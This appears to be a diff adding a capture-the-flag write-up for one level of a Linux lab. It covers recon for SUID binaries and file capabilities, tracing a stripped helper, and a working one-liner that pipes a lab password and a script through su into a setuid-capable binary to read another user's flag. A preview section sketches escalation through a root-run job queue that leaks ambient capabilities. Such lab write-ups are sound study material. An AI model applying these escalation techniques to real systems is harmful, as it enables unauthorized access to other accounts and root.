@@ -1,0 +1,67 @@
+goal: become the "builder" user (uid 1001) and read /home/builder/.flag
+
+start: logged in as ghost2, escalated to deploy via the vault credential from
+level1 (halcyon-backup /var/backups/.vault/deploy.secret -> "deploy-<random>").
+NOTE: this password rotates on every fresh ssh session/reconnect to ghost2 --
+re-read the vault secret each time before trying `su deploy`.
+
+kael.txt fragment 2 (as deploy):
+  Habit says hunt for setuid binaries -- find -perm -4000 comes up empty.
+  Power moved to Linux file capabilities instead. A helper "can change who it
+  runs as without ever being setuid root" -- find it with getcap, use it.
+
+recon (as deploy):
+  find / -perm -4000 2>/dev/null        -> nothing (classic SUID hunt is a dead end)
+  getcap -r / 2>/dev/null (same set as level1, plus now visible/executable to deploy):
+    /usr/local/bin/hal-deploy-run   cap_setgid,cap_setuid=ep   (-rwxr-x--- root:deploy)
+    /usr/local/bin/hal-runner-wrap  cap_setuid=ep              (-rwxr-x--- root:root, deploy can't exec)
+    /usr/local/bin/hal-guard        cap_dac_override=ep        (-r-xr-x--- ops:ops, deploy can't exec)
+  -> hal-deploy-run is the deploy-usable one.
+
+  Also present (context for later levels, not needed here):
+    /opt/hal-runner/jobs/           drwx-wx--- builder:builder
+    /usr/local/bin/hal-runner-loop  running as root (pid), reads /src/provision/hal-runner-loop.sh:
+      every 30s, execs anything in /opt/hal-runner/jobs/ via hal-runner-wrap AS builder.
+      (this queue is the mechanism for the NEXT level, not this one -- don't confuse the two)
+
+hal-deploy-run behavior (worked out empirically, binary is stripped/no --help):
+  - Running it with path arguments (e.g. `hal-deploy-run /bin/id`, `hal-deploy-run
+    /usr/bin/touch /tmp/x`, `hal-deploy-run /path/to/script.sh`) produces ZERO
+    observable effect: no output, no created files, exit code 0. argv is NOT
+    used as "the command to run".
+  - Confirmed via a python3/ctypes ptrace syscall tracer (strace/ltrace not
+    installed on box) that it does: getpwnam("builder") -> setresgid(1001) ->
+    setresuid(1001) -> then execs a shell. (Tracing itself strips the file
+    capability grant since the tracer is unprivileged, so setuid/setgid
+    EPERM'd under trace -- but this confirmed the uid/gid target is 1001 and
+    the call order.)
+  - The real mechanism: it drops privileges to builder (uid=gid=1001) and then
+    runs bash READING FROM STDIN. It's a "pipe a script in, it runs as
+    builder" tool, not an argv-based launcher.
+  - Gotcha: `su deploy -c '...'` consumes exactly one line of the piped stdin
+    for su's own password prompt; everything piped in AFTER that first line
+    passes through to whatever su ultimately execs, including hal-deploy-run's
+    inherited stdin. So the working invocation pipes password + script as one
+    stream.
+
+exploit:
+  printf 'deploy-6tvkb5dqd8\nid > /tmp/stdintest.txt\nwhoami >> /tmp/stdintest.txt\ncat /home/builder/.flag > /tmp/flagout.txt 2>/tmp/flagerr.txt\n' \
+    | su deploy -c '/usr/local/bin/hal-deploy-run'
+
+  /tmp/stdintest.txt -> uid=1001(builder) gid=1001(builder) groups=1001(builder),1000(deploy)
+  /tmp/flagout.txt   -> GHS2{6f2de8fd8fb095986df5607532b385c7}
+
+  (note: $HOME stays /home/deploy in the spawned bash since env is inherited,
+  not reset by hal-deploy-run -- use absolute paths like /home/builder/kael.txt,
+  not ~, when reading builder's files this way.)
+
+flag: GHS2{6f2de8fd8fb095986df5607532b385c7}
+
+--- next up (level3 preview, from kael.txt fragment 3 read as builder) ---
+goal: become "ops" service account, read /var/lib/ops/.flag
+hint: hal-runner-loop's wrapper (hal-runner-wrap) hands AMBIENT capabilities
+down to whatever it execs from /opt/hal-runner/jobs/. Builder can write into
+that jobs directory (owns it, drwx-wx---). Drop something there, let the
+root-run wrapper launch it, and it inherits the wrapper's capability --
+which per kael can change to root. Use `getpcaps` on the running child to see
+what leaked in.
